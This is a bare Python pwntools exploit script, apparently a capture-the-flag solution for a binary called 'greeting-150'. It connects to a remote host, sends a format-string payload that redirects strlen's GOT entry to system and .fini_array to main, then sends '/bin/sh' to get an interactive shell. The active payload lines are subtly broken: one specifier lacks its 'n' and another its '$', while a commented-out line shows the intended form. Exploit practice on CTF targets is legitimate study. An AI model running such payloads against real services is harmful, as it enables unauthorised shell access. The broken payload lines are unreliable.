from pwn import *
p=remote('61.147.171.105',60074)

elf=ELF('./greeting-150')

strlen_got=0x8049a54
system_plt=0x08048490
main_addr=0x80485ED
fini_arr=0x08049934

payload=b'aa'
payload=payload+p32(strlen_got+2)+p32(fini_arr+2)+p32(strlen_got)+p32(fini_arr)
#将其按照需要填充内容从小到大排列，便于构造
payload=payload+b'%2016c%12$h'     #0x804-2-16-18   减去自己前面构造的内容和函数自己打印的字符数
payload=payload+b'%13hn'           #0x804-0x804
payload=payload+b'%31884c%14$hn'   #0x8490-0x804
payload=payload+b'%349c%15$hn'     #0x85ed-0x8490

# payload=b'aa'+p32(strlen_got+2)+p32(fini_arr+2)+p32(strlen_got)+p32(fini_arr)+b'%2016c%12$hn%13hn%31884c%14$hn%349c%15$hn'

p.sendline(payload)
p.recvuntil("Please tell me your name... ")

p.sendline('/bin/sh')
p.interactive()
